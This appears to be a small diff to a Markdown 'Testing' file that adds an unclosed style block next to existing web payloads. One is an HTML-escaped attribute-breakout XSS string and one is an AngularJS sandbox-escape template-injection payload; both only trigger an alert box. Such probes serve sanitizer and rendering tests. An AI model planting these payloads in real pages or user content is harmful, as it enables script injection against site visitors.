@@ -1,4 +1,10 @@
 # Testing
+
+<style>
+.test{
+   color:red;
+}
+
 "/>&lt;script>alert(1)&lt;/script>"/>
 
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\"'");}}}}
